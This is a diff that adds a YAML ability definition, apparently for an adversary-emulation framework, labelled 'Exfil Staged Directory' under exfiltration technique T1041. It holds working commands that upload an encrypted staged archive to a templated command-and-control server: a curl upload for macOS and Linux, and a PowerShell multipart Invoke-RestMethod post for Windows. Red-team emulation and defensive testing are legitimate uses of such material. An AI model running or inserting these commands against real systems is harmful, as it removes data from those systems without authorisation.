@@ -1,0 +1,31 @@
+---
+
+- id: ea713bc4-63f0-491c-9a6f-0b01d560b87e
+  name: Exfil Staged Directory
+  description: Exfil Staged Directory
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over Command and Control Channel
+  executors:
+    darwin:
+      command: |
+        curl -F "data=@#{files}/staged.tgz.enc" #{server}/file/upload
+    linux:
+      command: |
+        curl -F "data=@#{files}/staged.tgz.enc" #{server}/file/upload
+    windows:
+      command: |
+        $fileBin = [System.IO.File]::ReadAllBytes("#{files}\staged.zip.enc");
+        $enc = [System.Text.Encoding]::GetEncoding('UTF-8');
+        $fileEnc = $enc.GetString($fileBin);
+        $boundary = [System.Guid]::NewGuid().ToString();
+        $LF = "`r`n";
+        $bodyLines = (
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"file`"; filename=`"staged.zip.enc`"",
+            "Content-Type: application/octet-stream$LF",
+            $fileEnc,
+            "--$boundary--$LF"
+        ) -join $LF;
+        Invoke-RestMethod -Uri #{server}/file/upload -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines;
